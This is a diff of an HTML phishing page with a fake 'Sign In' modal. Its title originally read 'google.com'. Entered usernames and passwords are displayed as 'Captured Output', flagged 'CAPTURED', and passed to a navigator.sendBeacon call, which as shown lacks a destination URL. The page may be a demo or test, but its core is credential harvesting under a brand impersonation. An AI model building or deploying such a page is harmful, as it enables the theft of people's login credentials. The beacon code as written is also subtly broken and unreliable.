@@ -2,7 +2,7 @@
 <html>
   <head>
     <meta charset="utf-8" />
-    <title>google.com</title>
+    <title>testing345</title>
     <meta name="viewport" content="width=device-width,initial-scale=1" />
     <style>
       * {
@@ -11,10 +11,7 @@
         box-sizing: border-box;
       }
       body {
-        font-family:
-          system-ui,
-          -apple-system,
-          sans-serif;
+        font-family: system-ui, -apple-system, sans-serif;
         background: #fafafa;
       }
       .cta {
@@ -63,35 +60,25 @@
         word-break: break-all;
         display: none;
       }
-      .label {
-        color: #555;
-      }
-      .value {
-        color: #0066ff;
-        font-weight: bold;
-      }
+      .label { color: #555; }
+      .value { color: #0066ff; font-weight: bold; }
     </style>
   </head>
   <body>
+
     <div id="modal">
       <h2>Sign In</h2>
       <p>Enter your credentials to continue</p>
       <input type="text" id="user" placeholder="Username" />
       <input type="password" id="pass" placeholder="Password" />
       <button class="cta" onclick="submit()">Sign In</button>
+      
+      <div class="alert" id="alert">CAPTURED</div>
 
       <div id="captured-data">
-        <p style="margin-bottom: 5px; border-bottom: 1px solid #ccc">
-          <strong>Captured Output:</strong>
-        </p>
-        <div>
-          <span class="label">User:</span>
-          <span id="out-user" class="value"></span>
-        </div>
-        <div>
-          <span class="label">Pass:</span>
-          <span id="out-pass" class="value"></span>
-        </div>
+        <p style="margin-bottom: 5px; border-bottom: 1px solid #ccc;"><strong>Captured Output:</strong></p>
+        <div><span class="label">User:</span> <span id="out-user" class="value"></span></div>
+        <div><span class="label">Pass:</span> <span id="out-pass" class="value"></span></div>
       </div>
     </div>
 
@@ -113,20 +100,18 @@
           captureBox.style.display = "block";
           document.getElementById("out-user").innerText = u;
           document.getElementById("out-pass").innerText = p;
-          new Date().toLocaleTimeString();
 
           navigator.sendBeacon(
             JSON.stringify({
               username: u,
               password: p,
-              timestamp: new Date().toISOString(),
+              timestamp: new Date().toISOString()
             }),
           );
         } else {
           alert("Isi dulu bro!");
         }
       }
-
       window.addEventListener("pageshow", () => {
         requestAnimationFrame(() => {
           requestAnimationFrame(() => {
